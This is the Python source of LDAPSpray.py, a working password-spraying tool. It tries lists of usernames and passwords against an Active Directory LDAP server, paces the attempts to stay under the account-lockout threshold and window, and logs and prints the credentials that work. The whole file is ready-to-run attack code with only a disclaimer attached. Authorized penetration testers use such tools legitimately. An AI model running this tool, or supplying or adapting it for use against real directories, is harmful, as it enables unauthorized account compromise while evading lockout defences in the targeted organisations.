from ldap3 import Server, Connection, ALL, NTLM
import logging, argparse, signal, sys
from colorama import Fore, Back, init
from time import sleep, asctime, localtime
from os import path

# Auto-reset Colorama colors
init(autoreset=True)
version = '0.1'

logging.basicConfig(level=logging.DEBUG, format='[%(asctime)s]-[%(levelname)s]: %(message)s')

parser = argparse.ArgumentParser(description=f"LDAPSpray.py v.{version} - LDAP password spraying tool", epilog=f"Written by m4lwhere - " + Fore.RED + F"YOU ARE RESPONSIBLE FOR YOUR OWN ACTIONS WITH THIS TOOL")
parser.add_argument("-U","--Users", help="Text file of usernames", required=True)
parser.add_argument("-P","--Passwords", help="Text file of passwords", required=True)
parser.add_argument("-D","--Domain", help="Domain used in authentication", required=True)
parser.add_argument("-S","--Server", help="IP/Hostname of LDAP Server used in authentication", required=True)
parser.add_argument("-L","--Lockout", help="Lockout threshold of bad passwords, inclusive number", type=int, required=True)
parser.add_argument("-W","--Window", help="Window of time before lockout counter resets (in MINUTES)", type=int, required=True)
parser.add_argument("-o","--output", help="Output file for activity", type=str)
parser.add_argument("-v","--verbose", help="List all authentication attempts", action="store_true")
parser.add_argument("--debug", help="Debug activity", action="store_true")
args = parser.parse_args()

# Check if we're debugging and to display or not
if not args.debug:
    logging.disable(logging.DEBUG)

logging.debug('Stating program')

# Check if we're recording output, and if the file exists or not
if args.output:
    try:
        if path.exists(args.output):
            logging.debug(f'Path for {args.output} exists and is a file for output.')

        else:
            logging.debug(f'Path for {args.output} does not exist and a file will be created.')
    except:
        logging.debug(f'Some major issue with {args.output}.')


# Function to read a file and return each line as an item in a list
def loadContents(file):
    with open(file) as f:
        readList = f.readlines()
        clean = [ line.strip() for line in readList ]
    logging.debug(f'Reading the {file} as values {clean}')
    return clean

# Function to write to a file
def writeFile(msg, file):
    with open(file, 'a+') as f:
        f.write(f"{msg}\n")
        logging.debug(f"Wrote the following info {msg} to file {file}")

# Attempt to authenticate on LDAP
def authAttempt(server, domain, user, passwd):
    s = Server(server, get_info=ALL)
    c = Connection(s, user=f'{domain}\{user}', password=passwd)
    # Check if there was a successful bind
    if not c.bind():
        if c.result["description"] == "invalidCredentials":
            if args.verbose:
                print(f'[{getTimestamp()}]-' + Fore.RED + f"[-] Bad credentials for user {domain}\{user}:{passwd}")
        else:  # Something silly happened
            print(f'[{getTimestamp()}]-' + Fore.RED + f'[-] Error in bind: {c.result["description"]}')
        return False
    else:  # Was a successful connection
        a = c.extend.standard.who_am_i()
        if a:
            print(f'[{getTimestamp()}]-' + Fore.GREEN + f'[+] Authenticated as {a}:{c.extend.microsoft._connection.password}')
            return True

def getTimestamp():
    t = localtime()
    return asctime(t)

# Gracefully handle CTRL-C within the program, allow users to change mind
def signal_handler(signal, frame):
    global successDict
    print('')
    ans = input(f'[{getTimestamp()}]-' + Fore.RED + f'[!] CTRL-C detected, do you want to quit? (Y/N) > ' + Fore.RESET)
    if ans.lower() == 'y':
        if len(successDict) == 0:
            print(f'[{getTimestamp()}]-' + Fore.RED + f'[!] No Creds found, quitting!' + Fore.RESET)
            sys.exit(0)
        print(f'[{getTimestamp()}]-' + Fore.GREEN + f'[+] Gathered creds below...' + Fore.RESET)
        for username, password in successDict.items():
            print(f'[{getTimestamp()}]-' + Fore.GREEN + f'[+] {username}:{password}')
        print(f'[{getTimestamp()}]-' + Fore.RED + f'[!] Quitting!' + Fore.RESET)
        if args.output:
            writeFile(f'[{getTimestamp()}]- Recieved CTRL-C to quit', args.output)
        sys.exit(0)
    else:
        print(f'[{getTimestamp()}]-' + Fore.CYAN + f'[+] Continuing...' + Fore.RESET)


# Catch CTRL+C and send it to our signal_handler function
signal.signal(signal.SIGINT, signal_handler)

logging.debug('Gathering list of users')
users = loadContents(args.Users)
logging.debug(f'List of users gathered, there are {len(users)} users in the list')
passwords = loadContents(args.Passwords)
logging.debug(f'List of passwords gathered, there are {len(passwords)} passwords in the list')

print('\n' + Fore.WHITE + Back.RED + f'***YOU ARE RESPONSIBLE FOR YOUR OWN ACTIONS USING THIS TOOL!***')
print('')

totalAttacks = len(users) * len(passwords)
print(f'[{getTimestamp()}]-' + Fore.RED + f'[!] THIS WILL ATTEMPT {totalAttacks} TOTAL ATTACKS, ARE YOU SURE?')
print(f'[{getTimestamp()}]-' + Fore.RED + f'[!] Enter the total number of attacks to proceed.')

ans = input(f'[{getTimestamp()}]-' + Fore.CYAN + f'({totalAttacks}) > ' + Fore.RESET)

try:
    ans = int(ans)
except ValueError:
    exit(Fore.MAGENTA + f"'{ans}' is not a number. I'm out." + Fore.RESET)

if ans != totalAttacks:
    exit(Fore.MAGENTA + f'Quitting, make up your mind!' + Fore.RESET)

atmptCount = 0
successfulUsers = []
successDict = {}

logging.debug(f'Lockout number is {args.Lockout} and type {type(args.Lockout)}')

if args.output:
    writeFile("\n=================== Starting new Attack =======================", args.output)
    writeFile(f"[{getTimestamp()}]- Started attack using Users file {args.Users} and password file {args.Passwords}.", args.output)
    writeFile(f"[{getTimestamp()}]- Attacking {args.Domain} and server {args.Server} with {args.Lockout} attempts every {args.Window} minutes.", args.output)

for pwd in passwords:
    logging.debug(f'Attempting login with attempt count {atmptCount}')
    print(f'[{getTimestamp()}]-' + Fore.BLUE + f'[*] Attempting password {pwd}')
    for user in users:
        if user in successfulUsers:
            continue
        if authAttempt(args.Server, args.Domain, user, pwd) == True:
            logging.debug(f'Successful authentication. Adding username {user} to successfulUsers list')
            successDict[user] = pwd
            successfulUsers.append(user)
            if args.output:
                writeFile(f"[{getTimestamp()}]- Successful auth for {user}:{pwd}", args.output)
    atmptCount += 1
    if atmptCount >= args.Lockout:
        print(f'[{getTimestamp()}]-' + Fore.YELLOW + f'[*] Hit attempt count of {args.Lockout}, sleeping for {args.Window} minutes')
        logging.debug(f'Detected attempt count is exceeded, sleeping for {args.Window * 60} seconds')
        sleep(args.Window * 60)
        atmptCount = 0

print(f'[{getTimestamp()}]-' + Fore.CYAN + f'[*] Completed {len(users) * len(passwords)} total attempts')
if args.output:
    writeFile(f"[{getTimestamp()}]- Completed attack", args.output)

        